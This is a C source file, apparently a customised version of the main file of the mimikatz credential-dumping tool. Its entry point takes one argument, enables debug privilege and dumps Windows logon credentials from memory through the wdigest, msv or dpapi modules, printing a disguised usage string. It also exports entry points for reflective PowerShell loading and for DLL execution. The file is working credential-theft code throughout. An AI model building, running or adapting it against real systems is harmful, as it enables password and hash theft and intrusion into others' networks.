/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimikatz.h"
//#include <fstream>

const KUHL_M * mimikatz_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
	&kuhl_m_sr98,
	&kuhl_m_rdm,
	&kuhl_m_acr,
};

int wmain(int argc, wchar_t * argv[])
{
	if (argc != 2)
	{
		kprintf(L":) datafindx");
		return -1;
	}
	mimikatz_begin();
	mimikatz_dispatchCommand(L"privilege::debug");
	if (wcscmp(argv[1],L"wdigest") == 0)
	{
		mimikatz_dispatchCommand(L"sekurlsa::wdigest");
	}
	else if (wcscmp(argv[1], L"msv") == 0)
	{
		mimikatz_dispatchCommand(L"sekurlsa::msv");
	}
	else
	{
		mimikatz_dispatchCommand(L"sekurlsa::dpapi");
		kuhl_m_dpapi_cred(argc, argv);
	}
	mimikatz_end();
	return STATUS_SUCCESS;
}

void mimikatz_begin()
{
	mimikatz_initOrClean(TRUE);
}

void mimikatz_end()
{
	mimikatz_initOrClean(FALSE);
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimikatz_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_POWERKATZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimikatz_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if(mimikatz_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				if(mimikatz_modules[indexModule]->description)
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if(mimikatz_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			if(mimikatz_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

#if defined(_WINDLL)
void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;
	if(AllocConsole())
	{
#pragma warning(push)
#pragma warning(disable:4996)
		freopen("CONOUT$", "w", stdout);
		freopen("CONOUT$", "w", stderr);
		freopen("CONIN$", "r", stdin);
#pragma warning(pop)
		if(lpszCmdLine && lstrlenW(lpszCmdLine))
		{
			if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
			{
				wmain(argc, argv);
				LocalFree(argv);
			}
		}
		else wmain(0, NULL);
	}
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;